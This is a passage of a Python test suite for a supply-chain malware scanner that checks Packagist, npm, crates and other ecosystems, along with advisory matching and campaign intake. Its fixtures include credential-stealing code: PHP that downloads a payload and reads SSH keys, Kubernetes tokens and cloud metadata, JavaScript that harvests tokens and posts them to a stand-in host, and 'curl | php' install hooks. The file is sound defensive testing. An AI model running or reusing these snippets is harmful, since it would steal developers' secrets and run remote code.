                        "dist": {"url": f"https://api.github.com/repos/Laravel-Lang/lang/zipball/new-{index}", "reference": f"new-{index}"},
                        "source": {"url": "https://github.com/Laravel-Lang/lang.git", "reference": f"new-{index}"},
                    }
                    for index in range(12)
                ]
            }
        }
        previous_snapshot = {
            "versions": [
                {"version": "14.3.7", "source_reference": "clean-sha", "dist_reference": "clean-dist"}
            ]
        }
        current_tags = [
            {"tag": "v14.3.7", "sha": "malicious-sha", "tagger_date": "2026-05-18T10:00:00Z", "reachable": False},
            {"tag": "v14.3.8", "sha": "other-sha", "tagger_date": "2026-05-18T10:01:00Z", "source_repo": "attacker/lang"},
        ]
        previous_tags = [{"tag": "v14.3.7", "sha": "clean-sha", "tagger_date": "2026-04-01T00:00:00Z"}]
        files = {
            "composer.json": json.dumps({"autoload": {"files": ["src/helpers.php"]}}),
            "src/helpers.php": (
                "<?php /* fixture only */ "
                "$ctx=stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]); "
                "$payload=file_get_contents('https://flipboxstudio.info/payload.php', false, $ctx); "
                "exec('php /tmp/.laravel_locale/loader.php &'); "
                "file_get_contents('http://169.254.169.254/latest/meta-data/'); "
                "file_get_contents('/proc/self/environ'); "
                "file_get_contents('/var/run/secrets/kubernetes.io/serviceaccount/token'); "
                "file_get_contents(getenv('HOME').'/.ssh/id_rsa');"
            ),
        }

        payload = supply_chain.analyze_packagist_source_package(
            "laravel-lang/lang",
            metadata=metadata,
            previous_snapshot=previous_snapshot,
            current_tags=current_tags,
            previous_tags=previous_tags,
            files=files,
        )
        signal_ids = {signal["rule_id"] for signal in payload["metadata_evidence"]["signals"] + payload["tag_evidence"]["signals"]}
        findings = "\n".join(payload["artifact_evidence"]["findings"]).lower()
        self.assertIn("PACKAGIST-MASS-VERSION-UPDATE", signal_ids)
        self.assertIn("PACKAGIST-HISTORICAL-SOURCE-REF-CHANGED", signal_ids)
        self.assertIn("GITHUB-TAG-REWRITTEN", signal_ids)
        self.assertIn("GITHUB-TAG-UNREACHABLE-COMMIT", signal_ids)
        self.assertIn("composer autoload.files", findings)
        self.assertIn("credential file discovery", findings)
        self.assertIn("flipboxstudio.info", payload["iocs"]["domains"])
        self.assertEqual(payload["verdict"], "malicious")

    def test_packagist_namespace_watch_expands_packages(self):
        metadata = {
            "packages": {
                "laravel-lang/lang": [
                    {"version": "14.3.7", "time": "2026-05-18T10:00:00Z", "dist": {"url": "https://example.test/lang.zip"}}
                ]
            }
        }
        with mock.patch.object(supply_chain, "_fetch_packagist_namespace_packages", return_value=["laravel-lang/lang"]), \
             mock.patch.object(supply_chain, "_fetch_ecosystem_metadata", return_value=metadata), \
             mock.patch.object(supply_chain, "_scan_release", return_value=supply_chain.ScanResult("packagist", "laravel-lang/lang", None, "14.3.7", "benign", "", None, None, None)):
            payload = supply_chain.watch_packagist_namespace(namespace="laravel-lang", since="7d", dry_run=True, limit=5)
        self.assertEqual(payload["packages"], ["laravel-lang/lang"])
        self.assertEqual(payload["total_scanned"], 1)

    def test_ecosystem_rules_detect_first_pass_risks(self):
        cases = {
            "crates": {
                "build.rs": 'use std::process::Command; fn main(){ Command::new("curl").arg("https://e.example").status().unwrap(); }',
            },
            "chrome-web-store": {
                "manifest.json": json.dumps({"permissions": ["tabs", "cookies"], "host_permissions": ["<all_urls>"]}),
            },
            "packagist": {
                "composer.json": json.dumps({"scripts": {"post-install-cmd": "curl https://e.example | php"}}),
                "src/Hook.php": "<?php eval(base64_decode($x));",
            },
            "go": {
                "main.go": 'package main\nimport "os/exec"\nfunc init(){ exec.Command("sh","-c","curl https://e.example").Run() }',
            },
            "huggingface": {
                "config.json": json.dumps({"trust_remote_code": True}),
                "model.bin": "binary fixture",
            },
            "maven": {
                "pom.xml": "<project><build><plugins><plugin><artifactId>exec-maven-plugin</artifactId></plugin></plugins></build></project>",
                "src/Main.java": "Runtime.getRuntime().exec(\"curl https://e.example\");",
            },
            "nuget": {
                "tools/install.ps1": "Invoke-WebRequest https://e.example/p.ps1 | powershell",
            },
            "open-vsx": {
                "package.json": json.dumps({"activationEvents": ["*"], "scripts": {"postinstall": "node setup.js"}}),
                "extension.js": "const cp = require('child_process'); cp.exec('env');",
            },
            "rubygems": {
                "extconf.rb": "require 'open3'; system('curl https://e.example')",
            },
        }
        for ecosystem, files in cases.items():
            payload = supply_chain.analyze_ecosystem_files(ecosystem, files)
            self.assertTrue(payload["findings"], ecosystem)
            self.assertIn(payload["ecosystem"], supply_chain.SUPPORTED_ECOSYSTEM_NAMES)

    def test_explain_verdict_includes_ecosystem_manifest_evidence(self):
        report = """
## Ecosystem Findings

- build.rs: crates build.rs install-time execution risk
- build.rs: crates build.rs environment credential access
"""
        payload = supply_chain.explain_verdict(
            report,
            ecosystem="crates",
            package="secopsai-fixture-crate",
            version="1.2.3",
        )
        rules = {rule["rule"] for rule in payload["matched_rules"]}
        self.assertIn("ecosystem manifest risk", rules)

    def test_chrome_web_store_scan_requires_local_artifact_without_advisory(self):
        payload = supply_chain.run_scan(
            ecosystem="chrome-web-store",
            package="fixtureextensionid",
            version="1.2.3",
            keep_report=False,
        )
        self.assertEqual(payload["result"]["verdict"], "skipped")
        self.assertIn("live registry fetch unsupported", payload["result"]["error"])

    def test_soc_finding_serializes_non_npm_ecosystem(self):
        result = supply_chain.ScanResult(
            ecosystem="maven",
            package="com.example:fixture",
            old_version="1.0.0",
            new_version="1.0.1",
            verdict="malicious",
            analysis="Deterministic rules flagged: ecosystem manifest risk",
            report_path="/tmp/report.md",
            rank=None,
            finding_id=supply_chain._finding_id("maven", "com.example:fixture", "1.0.1"),
        )
        finding = supply_chain._build_finding(result)
        self.assertEqual(finding["ecosystem"], "maven")
        self.assertEqual(finding["package"], "com.example:fixture")
        self.assertIn("com.example:fixture@1.0.1", finding["title"])

    def test_advisory_version_range_match(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            advisory_dir = Path(temp_dir) / "advisories"
            advisory_dir.mkdir()
            (advisory_dir / "test.json").write_text(json.dumps({
                "advisory_id": "ADV-RANGE",
                "title": "Range advisory",
                "status": "active",
                "affected": [{
                    "ecosystem": "pypi",
                    "package": "sample",
                    "version_ranges": [{"introduced": "2.0.0", "fixed": "2.0.5"}],
                }],
            }), encoding="utf-8")
            with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir):
                matched = supply_chain.check_advisory("pypi", "sample", "2.0.3")
                not_matched = supply_chain.check_advisory("pypi", "sample", "2.0.5")

        self.assertTrue(matched["matched"])
        self.assertFalse(not_matched["matched"])

    def test_advisory_index_refreshes_when_files_change(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            advisory_dir = Path(temp_dir) / "advisories"
            advisory_dir.mkdir()
            advisory_path = advisory_dir / "test.json"
            advisory_path.write_text(json.dumps({
                "advisory_id": "ADV-CACHE",
                "title": "Cached advisory",
                "status": "active",
                "affected": [{"ecosystem": "npm", "package": "cached-pkg", "versions": ["1.0.0"]}],
            }), encoding="utf-8")
            with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir):
                first = supply_chain.check_advisory("npm", "cached-pkg", "1.0.0")
                advisory_path.write_text(json.dumps({
                    "advisory_id": "ADV-CACHE",
                    "title": "Cached advisory",
                    "status": "active",
                    "affected": [{"ecosystem": "npm", "package": "cached-pkg", "versions": ["2.0.0"]}],
                }), encoding="utf-8")
                second = supply_chain.check_advisory("npm", "cached-pkg", "2.0.0")
                stale = supply_chain.check_advisory("npm", "cached-pkg", "1.0.0")

        self.assertTrue(first["matched"])
        self.assertTrue(second["matched"])
        self.assertFalse(stale["matched"])

    def test_removed_artifact_with_advisory_creates_malicious_finding(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            advisory_dir = temp_path / "advisories"
            findings_dir = temp_path / "findings"
            advisory_dir.mkdir()
            (advisory_dir / "test.json").write_text(json.dumps({
                "advisory_id": "ADV-REMOVED",
                "title": "Removed artifact advisory",
                "status": "active",
                "affected": [{"ecosystem": "npm", "package": "@scope/removed", "versions": ["9.9.9"]}],
                "detection_rationale": ["Registry artifact was removed after compromise."],
            }), encoding="utf-8")
            old_findings_dir = os.environ.get("SECOPS_FINDINGS_DIR")
            os.environ["SECOPS_FINDINGS_DIR"] = str(findings_dir)
            try:
                with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir), \
                     mock.patch.object(supply_chain, "RESULTS_PATH", temp_path / "results.jsonl"), \
                     mock.patch.object(supply_chain, "_npm_get_previous_version", return_value="9.9.8"), \
                     mock.patch.object(supply_chain, "_diff_package", return_value=(None, None)):
                    payload = supply_chain.run_scan(
                        ecosystem="npm",
                        package="@scope/removed",
                        version="9.9.9",
                        previous_version=None,
                    )
            finally:
                if old_findings_dir is None:
                    os.environ.pop("SECOPS_FINDINGS_DIR", None)
                else:
                    os.environ["SECOPS_FINDINGS_DIR"] = old_findings_dir

        result = payload["result"]
        self.assertEqual(result["verdict"], "malicious")
        self.assertIn("advisory_matches", result)
        self.assertIn("advisory matched", result["error"])
        self.assertTrue(payload["db_path"].endswith("openclaw_soc.db"))

    def test_explain_verdict_includes_advisory_evidence(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            advisory_dir = Path(temp_dir) / "advisories"
            advisory_dir.mkdir()
            (advisory_dir / "test.json").write_text(json.dumps({
                "advisory_id": "ADV-EXPLAIN",
                "title": "Explain advisory",
                "status": "active",
                "affected": [{"ecosystem": "pypi", "package": "guardrails-ai", "versions": ["0.10.1"]}],
                "iocs": {"file_paths": ["/tmp/transformers.pyz"]},
                "remediation": ["Remove version 0.10.1 and rotate exposed credentials."],
            }), encoding="utf-8")
            with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir):
                payload = supply_chain.explain_verdict(
                    "",
                    ecosystem="pypi",
                    package="guardrails-ai",
                    version="0.10.1",
                )

        self.assertEqual(payload["verdict"], "malicious")
        self.assertEqual(payload["advisory_matches"][0]["advisory_id"], "ADV-EXPLAIN")
        self.assertIn("emergency advisory match", [rule["rule"] for rule in payload["matched_rules"]])

    def test_node_ipc_seed_advisory_matches_affected_versions_only(self):
        for version in ("9.1.6", "9.2.3", "12.0.1"):
            payload = supply_chain.check_advisory("npm", "node-ipc", version)
            self.assertTrue(payload["matched"], version)
            self.assertEqual(payload["matches"][0]["campaign_id"], "node-ipc-stealer-backdoor-2026")

        clean = supply_chain.check_advisory("npm", "node-ipc", "12.0.0")
        self.assertFalse(clean["matched"])

    def test_javascript_semantic_findings_detect_node_ipc_style_payload(self):
        source = """
const os = require("os");
const fs = require("fs");
const https = require("https");
(() => {
  const host = os.hostname();
  const home = os.homedir();
  const env = process.env.GITHUB_TOKEN || process.env.NPM_TOKEN;
  const files = [home + "/.ssh/id_rsa", home + "/.npmrc", home + "/.env"].map((p) => fs.readFileSync(p, "utf8"));
  const body = Buffer.from(JSON.stringify({ host, env, files })).toString("base64");
  https.request("https://example.invalid/collect").end(body);
})();
"""
        findings = supply_chain._javascript_semantic_findings("node-ipc.cjs", source)
        joined = "\n".join(findings)
        self.assertIn("module-load execution", joined)
        self.assertIn("host fingerprinting", joined)
        self.assertIn("local file enumeration", joined)
        self.assertIn("credential harvesting", joined)
        self.assertIn("exfiltration staging", joined)
        self.assertIn("node-ipc CommonJS bundle", joined)

    def test_classifier_flags_node_ipc_style_semantic_findings(self):
        report = """
## Semantic Findings

- node-ipc.cjs: javascript module-load execution via IIFE/self-executing payload
- node-ipc.cjs: javascript host fingerprinting via os APIs
- node-ipc.cjs: javascript local file enumeration of developer or credential paths
- node-ipc.cjs: javascript environment credential harvesting via process.env
- node-ipc.cjs: javascript payload wrapping or exfiltration staging
- node-ipc.cjs: node-ipc CommonJS bundle contains high-risk appended payload indicators
"""
        payload = supply_chain.explain_verdict(report, ecosystem="npm", package="node-ipc", version="12.0.2")
        self.assertEqual(payload["verdict"], "malicious")
        rules = {rule["rule"] for rule in payload["matched_rules"]}
        self.assertIn("semantic module-load execution", rules)
        self.assertIn("semantic credential harvesting", rules)
        self.assertIn("node-ipc bundle payload indicators", rules)

    def test_watch_registry_dry_run_scans_mocked_recent_npm_version_without_persisting(self):
        now = 1_800_000_000.0
        metadata = {
            "time": {
                "created": "2026-05-01T00:00:00.000Z",
                "9.2.2": "2026-05-01T00:00:00.000Z",
                "9.2.3": datetime_from_epoch(now - 60),
                "modified": datetime_from_epoch(now - 30),
            }
        }
        fake_result = supply_chain.ScanResult(
            ecosystem="npm",
            package="node-ipc",
            old_version="9.2.2",
            new_version="9.2.3",
            verdict="malicious",
            analysis="advisory matched",
            report_path=None,
            rank=None,
            finding_id="SCM-NODEIPC",
        )
        with mock.patch.object(supply_chain, "_scan_release", return_value=fake_result) as scan_mock, \
             mock.patch.object(supply_chain, "_append_results") as append_mock, \
             mock.patch.object(supply_chain, "_upsert_findings") as upsert_mock:
            payload = supply_chain.watch_registry(
                ecosystem="npm",
                package="node-ipc",
                since="10m",
                dry_run=True,
                persist=False,
                metadata=metadata,
                now=now,
            )

        self.assertEqual(payload["total_scanned"], 1)
        self.assertEqual(payload["malicious"], 1)
        scan_mock.assert_called_once()
        self.assertEqual(scan_mock.call_args.kwargs["old_version"], "9.2.2")
        append_mock.assert_not_called()
        upsert_mock.assert_not_called()

    def test_watch_registry_package_scoped_new_ecosystem_uses_metadata_rows(self):
        now = 1_800_000_000.0
        metadata = {
            "versions": [
                {"num": "1.0.0", "created_at": datetime_from_epoch(now - 900)},
                {"num": "1.0.1", "created_at": datetime_from_epoch(now - 60)},
            ]
        }
        fake_result = supply_chain.ScanResult(
            ecosystem="crates",
            package="fixture",
            old_version="1.0.0",
            new_version="1.0.1",
            verdict="benign",
            analysis="reviewed",
            report_path=None,
            rank=None,
            finding_id=None,
        )
        with mock.patch.object(supply_chain, "_scan_release", return_value=fake_result) as scan_mock:
            payload = supply_chain.watch_registry(
                ecosystem="crates",
                package="fixture",
                since="10m",
                dry_run=True,
                persist=False,
                metadata=metadata,
                now=now,
            )
        self.assertEqual(payload["total_scanned"], 1)
        self.assertEqual(payload["recent_versions"][0]["version"], "1.0.1")
        self.assertEqual(scan_mock.call_args.kwargs["old_version"], "1.0.0")

    def test_node_ipc_mitigation_keeps_package_verdict_independent_of_local_usage(self):
        payload = supply_chain.explain_verdict("", ecosystem="npm", package="node-ipc", version="12.0.1")
        self.assertEqual(payload["verdict"], "malicious")
        self.assertEqual(payload["environment_impact"]["status"], "unknown")
        self.assertTrue(any("Block affected versions" in step for step in payload["mitigation"]))

    def test_deadcode_campaign_advisory_matches_reported_packages(self):
        for package in [
            "chalk-tempalte",
            "@deadcode09284814/axios-util",
            "axois-utils",
            "color-style-utils",
        ]:
            payload = supply_chain.check_advisory("npm", package, "0.0.1")
            self.assertTrue(payload["matched"], package)
            self.assertEqual(payload["matches"][0]["campaign_id"], "deadcode09284814-infostealer-botnet-campaign")

    def test_campaign_ioc_extraction_handles_defanged_indicators(self):
        payload = supply_chain.extract_campaign_iocs([
            "Credentials were sent to 87e0bbc636999b.lhr[.]life and 80.200.28[.]28:2222.",
            "Repository description: A Mini Sha1-Hulud has Appeared",
        ])
        self.assertIn("87e0bbc636999b.lhr.life", payload["domains"])
        self.assertIn("80.200.28.28:2222", payload["ip_ports"])
        self.assertIn("A Mini Sha1-Hulud has Appeared", payload["repository_descriptions"])

    def test_watch_npm_namespace_detects_mass_publish_burst(self):
        packages = [
            "@redhat-cloud-services/chrome",
            "@redhat-cloud-services/frontend-components",
            "@redhat-cloud-services/insights-client",
            "@redhat-cloud-services/rbac-client",
            "@redhat-cloud-services/vulnerabilities-client",
        ]
        base_epoch = datetime(2026, 6, 1, 14, 20, tzinfo=timezone.utc).timestamp()
        metadata_map = {}
        for index, package in enumerate(packages):
            metadata_map[package] = {
                "name": package,
                "time": {
                    "created": "2026-01-01T00:00:00.000Z",
                    "modified": "2026-06-01T14:40:00.000Z",
                    "1.0.0": datetime_from_epoch(base_epoch - 86400),
                    "1.0.1": datetime_from_epoch(base_epoch + index * 60),
                    "1.0.2": datetime_from_epoch(base_epoch + index * 60 + 180),
                },
                "versions": {
                    "1.0.1": {
                        "scripts": {"preinstall": "node index.js"},
                        "dist": {"tarball": f"https://registry.npmjs.org/{package}/-/{index}.tgz", "integrity": f"sha512-{index}a", "shasum": f"{index}a"},
                    },
                    "1.0.2": {
                        "scripts": {"preinstall": "node index.js"},
                        "dist": {"tarball": f"https://registry.npmjs.org/{package}/-/{index}b.tgz", "integrity": f"sha512-{index}b", "shasum": f"{index}b"},
                    },
                },
            }
        with mock.patch.object(
            supply_chain,
            "_scan_release",
            side_effect=lambda ecosystem, package, version, **kwargs: supply_chain.ScanResult(
                ecosystem,
                package,
                kwargs.get("old_version") or "unknown",
                version,
                "benign",
                "fixture scan skipped",
                None,
                None,
                None,
            ),
        ):
            payload = supply_chain.watch_npm_namespace(
                namespace="redhat-cloud-services",
                since="2h",
                dry_run=True,
                limit=10,
                packages=packages,
                metadata_map=metadata_map,
                now=base_epoch + 3600,
            )
        namespace_rules = {row["rule_id"] for row in payload["namespace_evidence"]["signals"]}
        package_rules = {row["rule_id"] for row in payload["package_source_signals"]}
        self.assertIn("NPM-NAMESPACE-MASS-PUBLISH-BURST", namespace_rules)
        self.assertIn("NPM-METADATA-LIFECYCLE-HOOK", package_rules)
        self.assertEqual(payload["total_scanned"], 10)

    def test_cli_watch_registry_routes_npm_namespace_to_namespace_watcher(self):
        payload = {
            "ecosystem": "npm",
            "namespace": "redhat-cloud-services",
            "total_scanned": 0,
            "malicious": 0,
            "errors": 0,
        }
        stdout = StringIO()
        with mock.patch.object(secopsai_cli, "watch_npm_namespace", return_value=payload) as watcher, \
             mock.patch("sys.stdout", stdout):
            exit_code = secopsai_cli.main([
                "--json",
                "supply-chain",
                "watch-registry",
                "--ecosystem",
                "npm",
                "--namespace",
                "redhat-cloud-services",
                "--since",
                "2h",
                "--limit",
                "3",
                "--dry-run",
            ])
        self.assertEqual(exit_code, 0)
        watcher.assert_called_once()
        self.assertEqual(watcher.call_args.kwargs["namespace"], "redhat-cloud-services")
        self.assertEqual(watcher.call_args.kwargs["since"], "2h")
        self.assertEqual(watcher.call_args.kwargs["limit"], 3)
        self.assertTrue(watcher.call_args.kwargs["dry_run"])
        self.assertIn('"namespace": "redhat-cloud-services"', stdout.getvalue())

    def test_watch_npm_namespace_surfaces_source_fetch_failures(self):
        with mock.patch.object(supply_chain, "_fetch_npm_namespace_packages", side_effect=RuntimeError("HTTP Error 429: Too Many Requests")):
            payload = supply_chain.watch_npm_namespace(
                namespace="redhat-cloud-services",
                since="2h",
                dry_run=True,
                limit=1,
            )
        self.assertEqual(payload["errors"], 1)
        self.assertEqual(payload["namespace_evidence"]["source_status"], "fetch_error")
        self.assertIn("429", payload["namespace_evidence"]["error"])
        self.assertEqual(payload["total_scanned"], 0)

    def test_npm_package_source_detects_rewritten_historical_integrity(self):
        current = {
            "name": "@redhat-cloud-services/chrome",
            "time": {"2.3.1": "2026-06-01T10:54:42.000Z"},
            "versions": {
                "2.3.1": {
                    "scripts": {"preinstall": "node index.js"},
                    "main": "index.js",
                    "dist": {
                        "tarball": "https://registry.npmjs.org/@redhat-cloud-services/chrome/-/chrome-2.3.1.tgz",
                        "integrity": "sha512-new",
                        "shasum": "new",
                    },
                }
            },
        }
        previous = {
            "versions": [
                {
                    "version": "2.3.1",
                    "published_at": "2026-06-01T10:54:42.000Z",
                    "tarball": "https://registry.npmjs.org/@redhat-cloud-services/chrome/-/chrome-2.3.1.tgz",
                    "integrity": "sha512-old",
                    "shasum": "old",
                }
            ]
        }
        payload = supply_chain.detect_npm_package_source_signals(
            "@redhat-cloud-services/chrome",
            current,
            previous_snapshot=previous,
        )
        rules = {row["rule_id"] for row in payload["signals"]}
        self.assertIn("NPM-HISTORICAL-INTEGRITY-CHANGED", rules)
        self.assertIn("NPM-HISTORICAL-SHASUM-CHANGED", rules)
        self.assertIn("NPM-METADATA-LIFECYCLE-HOOK", rules)

    def test_redhat_cloud_services_emergency_advisory_matches_chrome(self):
        payload = supply_chain.check_advisory("npm", "@redhat-cloud-services/chrome", "2.3.1")
        self.assertTrue(payload["matched"])
        self.assertEqual(
            payload["matches"][0]["advisory_id"],
            "SECOPSAI-ADV-2026-06-MINI-SHAI-HULUD-REDHAT-CLOUD-SERVICES",
        )

    def test_research_campaign_correlates_npm_fixture(self):
        fixture = REPO_ROOT / "tests" / "fixtures" / "deadcode09284814-campaign.json"
        campaign = json.loads(fixture.read_text(encoding="utf-8"))
        payload = supply_chain.research_campaign(campaign=campaign, dry_run=True, no_fetch=True)
        self.assertEqual(payload["campaign_id"], "deadcode09284814-infostealer-botnet-campaign")
        self.assertEqual(len(payload["packages"]), 4)
        self.assertIn(payload["campaign_verdict"], {"confirmed_true_positive", "likely_true_positive"})
        self.assertEqual(payload["environment_impact"]["status"], "not_observed")
        self.assertTrue(any(item["signal"] == "same_publisher" for item in payload["correlations"]))
        self.assertTrue(any("Shai-Hulud" in item for item in payload["behavioral_indicators"]))
        chalk = next(item for item in payload["packages"] if item["package"] == "chalk-tempalte")
        self.assertIn(chalk["package_verdict"], {"confirmed_true_positive", "likely_true_positive"})
        self.assertIn("87e0bbc636999b.lhr.life", chalk["iocs"]["domains"])

    def test_research_campaign_separates_local_impact_from_package_verdict(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            (root / "package-lock.json").write_text(
                json.dumps({"packages": {"node_modules/chalk-tempalte": {"version": "0.0.1"}}}),
                encoding="utf-8",
            )
            campaign = json.loads((REPO_ROOT / "tests" / "fixtures" / "deadcode09284814-campaign.json").read_text(encoding="utf-8"))
            payload = supply_chain.research_campaign(campaign=campaign, search_root=str(root), dry_run=True, no_fetch=True)
        chalk = next(item for item in payload["packages"] if item["package"] == "chalk-tempalte")
        self.assertEqual(chalk["environment_impact"]["status"], "confirmed_affected")
        self.assertIn(chalk["package_verdict"], {"confirmed_true_positive", "likely_true_positive"})

    def test_research_campaign_can_persist_soc_findings_with_campaign_id(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            old_findings_dir = os.environ.get("SECOPS_FINDINGS_DIR")
            os.environ["SECOPS_FINDINGS_DIR"] = temp_dir
            try:
                campaign = json.loads((REPO_ROOT / "tests" / "fixtures" / "deadcode09284814-campaign.json").read_text(encoding="utf-8"))
                payload = supply_chain.research_campaign(campaign=campaign, dry_run=False, persist=True, no_fetch=True)
            finally:
                if old_findings_dir is None:
                    os.environ.pop("SECOPS_FINDINGS_DIR", None)
                else:
                    os.environ["SECOPS_FINDINGS_DIR"] = old_findings_dir
        self.assertTrue(payload["finding_ids"])
        self.assertTrue(payload["db_path"])

    def test_research_campaign_accepts_cross_ecosystem_packages(self):
        campaign = {
            "campaign_id": "unit-cross-ecosystem-campaign",
            "source_urls": ["https://example.com/report"],
            "iocs": {"domains": ["c2.example"]},
            "packages": [
                {
                    "ecosystem": "pypi",
                    "package": "evil_pkg",
                    "version": "1.0.0",
                    "files": {"setup.py": "import os, subprocess; subprocess.Popen(['curl','https://c2.example'])"},
                },
                {
                    "ecosystem": "crates",
                    "package": "evil-crate",
                    "version": "1.0.0",
                    "files": {"build.rs": "std::process::Command::new(\"curl\"); std::env::var(\"GITHUB_TOKEN\");"},
                },
                {
                    "ecosystem": "maven",
                    "package": "com.example:evil",
                    "version": "1.0.0",
                    "files": {"src/Main.java": "Runtime.getRuntime().exec(\"curl https://c2.example\"); System.getenv(\"AWS_SECRET_ACCESS_KEY\");"},
                },
            ],
        }
        payload = supply_chain.research_campaign(campaign=campaign, dry_run=True, no_fetch=True)
        self.assertEqual(set(payload["ecosystems"]), {"crates", "maven", "pypi"})
        self.assertEqual(len(payload["packages"]), 3)
        self.assertTrue(all(item["matched_rules"] for item in payload["packages"]))
        self.assertIn(payload["campaign_verdict"], {"likely_true_positive", "confirmed_true_positive"})

    def test_cli_research_campaign_outputs_json(self):
        fixture = REPO_ROOT / "tests" / "fixtures" / "deadcode09284814-campaign.json"
        stdout = StringIO()
        with mock.patch("sys.stdout", stdout):
            exit_code = secopsai_cli.main([
                "--json",
                "supply-chain",
                "research-campaign",
                "--input",
                str(fixture),
                "--dry-run",
            ])
        self.assertEqual(exit_code, 0)
        self.assertIn('"campaign_id": "deadcode09284814-infostealer-botnet-campaign"', stdout.getvalue())

    def test_campaign_intake_extracts_packages_iocs_and_behavior(self):
        text = (
            "Four malicious npm packages chalk-tempalte, @deadcode09284814/axios-util, "
            "axois-utils, and color-style-utils steal credentials and talk to "
            "87e0bbc636999b.lhr[.]life plus 80.200.28[.]28:2222. Published by deadcode09284814."
        )
        payload = supply_chain.campaign_intake(text=text, source_name="Unit Source", source_url="https://example.com/report")
        packages = {item["package"] for item in payload["campaign"]["packages"]}
        self.assertIn("chalk-tempalte", packages)
        self.assertIn("@deadcode09284814/axios-util", packages)
        self.assertIn("87e0bbc636999b.lhr.life", payload["campaign"]["iocs"]["domains"])
        self.assertTrue(any("credential" in item.lower() for item in payload["campaign"]["behavioral_indicators"]))
        self.assertGreaterEqual(payload["score"], 35)

    def test_campaign_intake_routes_redhat_mini_shai_hulud_to_campaign_research(self):
        text = (
            "Mini Shai-Hulud campaign compromised Red Hat Cloud Services npm packages. "
            "Affected package @redhat-cloud-services/chrome@2.3.1 uses preinstall node index.js, "
            "AES-128-GCM encrypted payloads, Bun runtime staging, gh auth token collection, "
            "GitHub Actions secrets, npm tokens, cloud credentials, and GitHub API dead-drop exfiltration."
        )
        payload = supply_chain.campaign_intake(
            text=text,
            source_name="Socket Research",
            source_url="https://socket.dev/blog/mini-shai-hulud-campaign-hits-red-hat-cloud-services-npm-packages",
        )
        packages = {(item["ecosystem"], item["package"], item["version"]) for item in payload["campaign"]["packages"]}
        behaviors = " ".join(payload["campaign"]["behavioral_indicators"]).lower()
        self.assertIn(("npm", "@redhat-cloud-services/chrome", "2.3.1"), packages)
        self.assertIn("install-time", behaviors)
        self.assertIn("github token", behaviors)
        self.assertEqual(payload["orchestrator"]["recommended_route"], "campaign_research")

    def test_campaign_intake_ignores_article_html_as_packages(self):
        text = (
            '<h3 id="overview">Overview</h3><p class="byline-author">'
            '<span id="docs-internal-guid-d358e087-7fff-fbc1-ad5b-f4611deb13fd" '
            'style="font-family: Google Sans; font-size: 10pt; line-height: 1.38;">'
            "A vulnerability tracked as CVE-2026-5756 allows user-supplied configuration changes "
            "in a web-based product hosted at kb.cert.org.</span></p>"
        )
        payload = supply_chain.campaign_intake(text=text, source_name="CERT/CC", source_url="https://kb.cert.org/vuls/id/748485")
        packages = {item["package"] for item in payload["campaign"]["packages"]}
        self.assertNotIn("overview", packages)
        self.assertNotIn("docs-internal-guid-d358e087-7fff-fbc1-ad5b-f4611deb13fd", packages)
        self.assertNotIn("font-family", packages)
        self.assertNotIn("cve-2026-5756", packages)
        self.assertNotIn("kb.cert.org", packages)
        self.assertFalse(packages)

    def test_campaign_intake_requires_package_context_for_hyphenated_words(self):
        text = (
            "Protecting cookies with hardware-backed session credentials describes "
            "short-lived browser sessions and cross-origin protections, but it does "
            "not name a software registry artifact."
        )
        payload = supply_chain.campaign_intake(text=text, source_name="Security Blog", source_url="https://example.com/post")
        packages = {item["package"] for item in payload["campaign"]["packages"]}
        self.assertNotIn("hardware-backed", packages)
        self.assertNotIn("short-lived", packages)
        self.assertNotIn("cross-origin", packages)

    def test_campaign_intake_extracts_vscode_extension_and_github_breach_signals(self):
        text = (
            "Compromised Nx Console 18.95.0 targeted VS Code developers. "
            "The extension fetched a payload from an orphan commit in github.com/nrwl/nx-console, "
            "harvested GitHub tokens, and exfiltrated via HTTPS, the GitHub API, and DNS tunneling. "
            "Users should update to 18.100.0."
        )
        payload = supply_chain.campaign_intake(
            text=text,
            source_name="GitHub Security Advisory",
            source_url="https://github.com/nrwl/nx-console/security/advisories/GHSA-c9j4-9m59-847w",
        )
        packages = {(item["ecosystem"], item["package"], item["version"]) for item in payload["campaign"]["packages"]}
        behaviors = " ".join(payload["campaign"]["behavioral_indicators"]).lower()
        self.assertIn(("open-vsx", "nrwl.angular-console", "18.95.0"), packages)
        self.assertIn(("github", "nrwl/nx-console", "unknown"), packages)
        self.assertIn("vs code extension", behaviors)
        self.assertIn("orphan commit", behaviors)
        self.assertIn("github token", behaviors)
        self.assertEqual(payload["orchestrator"]["campaign_type"], "vscode_extension_compromise")
        self.assertEqual(payload["orchestrator"]["recommended_route"], "extension_security_review")

    def test_campaign_orchestrator_routes_webworm_as_threat_intel_not_package_campaign(self):
        text = (
            "Webworm Deploys EchoCreep and GraphWorm Backdoors Using Discord and MS Graph API. "
            "Cybersecurity researchers flagged fresh activity from a China-aligned threat actor known as Webworm "
            "deploying custom backdoors that use Discord and Microsoft Graph API for command-and-control communications. "
            "https://thehackernews.com/2026/05/webworm-deploys-echocreep-and-graphworm.html"
        )
        payload = supply_chain.campaign_intake(
            text=text,
            source_name="The Hacker News",
            source_url="https://thehackernews.com/2026/05/webworm-deploys-echocreep-and-graphworm.html",
        )
        review = payload["orchestrator"]
        self.assertEqual(review["campaign_type"], "malware_apt_c2")
        self.assertEqual(review["recommended_route"], "threat_intel_review")
        self.assertEqual(payload["campaign"]["packages"], [])
        self.assertIn("not a package supply-chain campaign", review["route_blockers"])
        self.assertNotIn("thehackernews.com", supply_chain._flatten_iocs(payload["campaign"]["iocs"]))
        self.assertIn("Webworm", payload["campaign"]["actors"])

    def test_campaign_orchestrator_rejects_placeholders_and_source_iocs(self):
        candidate = {
            "candidate_id": "unit-candidate",
            "source_url": "https://thehackernews.com/report",
            "campaign": {
                "campaign_id": "unit-candidate",
                "title": "Generic report",
                "summary": "known publisher and @scope/pkg placeholder at https://thehackernews.com/report",
